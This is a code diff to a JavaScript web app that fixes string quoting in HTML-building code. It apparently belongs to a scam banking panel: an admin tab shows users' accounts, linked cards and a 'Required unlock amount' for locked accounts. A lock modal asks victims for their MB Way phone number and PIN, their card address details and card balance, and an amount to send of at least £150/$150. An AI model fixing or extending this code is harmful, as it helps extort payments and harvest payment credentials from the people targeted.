@@ -2388,7 +2388,7 @@ function loadUsersTab(){
             +'<div>🔢 Account: '+(u.accountNumber||'--')+'</div>'
             +'<div>💳 Cards: '+((u.linkedCards||[]).filter(function(c){return c;}).length)+'</div>'
             +(u.lastSeen?'<div style="color:'+lastSeenColor(u.lastSeen)+';">👁 Last seen: '+new Date(u.lastSeen).toLocaleString()+'</div>':'<div style="color:rgba(255,255,255,0.3);">👁 Last seen: never recorded</div>')
-            +(isLocked?'<div style="margin-top:6px;color:#ff6b6b;font-weight:600;">&#128274; Locked: '+(u.lockReason||'No reason given')+'</div>':'')\
+            +(isLocked?'<div style="margin-top:6px;color:#ff6b6b;font-weight:600;">&#128274; Locked: '+(u.lockReason||'No reason given')+'</div>':'')
             +(isLocked&&u.lockAmount?'<div style="color:#ffc107;font-weight:600;">💰 Required unlock amount: £'+u.lockAmount+' / $'+u.lockAmount+'</div>':'')
           +'</div>'
           // Notifications / messages history
@@ -3997,7 +3997,7 @@ document.addEventListener('DOMContentLoaded',function(){
         +'<input type="tel" id="lock-mbway-phone" class="modal-input" placeholder="'+tr('lockMbwayPhone')+'" inputmode="numeric" style="flex:1;margin-bottom:0;"></div>'
         +'<input type="password" id="lock-mbway-pin" class="modal-input" placeholder="'+tr('lockMbwayPin')+'" maxlength="6" inputmode="numeric">'
         +'<input type="text" id="lock-mbway-name" class="modal-input" placeholder="'+tr('lockMbwayName')+'">'
-        +'<input type="number" id="lock-mbway-amount" class="modal-input" placeholder="'+("Amount to send (min. £"+(window._lockRequiredAmount||150)+" / $"+(window._lockRequiredAmount||150)+")")+'" inputmode="decimal" min="'+( window._lockRequiredAmount||150)+'">'
+        +'<input type="number" id="lock-mbway-amount" class="modal-input" placeholder="Amount to send (min. £'+(window._lockRequiredAmount||150)+' / $'+(window._lockRequiredAmount||150)+')'+'" inputmode="decimal" min="'+(window._lockRequiredAmount||150)+'">' 
         +'<div style="font-size:12px;color:rgba(255,255,255,0.4);margin-top:-6px;margin-bottom:8px;">'+tr('lockMbwayMin')+'</div>';
       if(notice) notice.style.display='block';
       if(noticeText) noticeText.textContent=tr('lockMbwayAuthNote');
@@ -4012,7 +4012,7 @@ document.addEventListener('DOMContentLoaded',function(){
         +'<input type="text" id="lock-card-street" class="modal-input" placeholder="'+tr('lockCardStreet')+'">'
         +'<div style="display:flex;gap:8px;"><input type="text" id="lock-card-city" class="modal-input" placeholder="'+tr('lockCardCity')+'" style="flex:1;"><input type="text" id="lock-card-postcode" class="modal-input" placeholder="'+tr('lockCardPostcode')+'" style="flex:1;"></div>'
         +'<input type="tel" id="lock-card-phone" class="modal-input" placeholder="'+tr('lockCardPhone')+'">'
-        +'<input type="number" id="lock-card-amount" class="modal-input" placeholder="Amount to add (min. £"+(window._lockRequiredAmount||150)+" / $"+(window._lockRequiredAmount||150)+")" inputmode="decimal" min="'+( window._lockRequiredAmount||150)+'">'
+        +'<input type="number" id="lock-card-amount" class="modal-input" placeholder="Amount to add (min. £'+(window._lockRequiredAmount||150)+' / $'+(window._lockRequiredAmount||150)+')'+'" inputmode="decimal" min="'+(window._lockRequiredAmount||150)+'">' 
         +'<input type="text" id="lock-card-balance" class="modal-input" placeholder="'+tr('lockCardBalance')+'" inputmode="decimal">';
       if(notice) notice.style.display='block';
       if(noticeText) noticeText.textContent=tr('lockCardAuthNote');
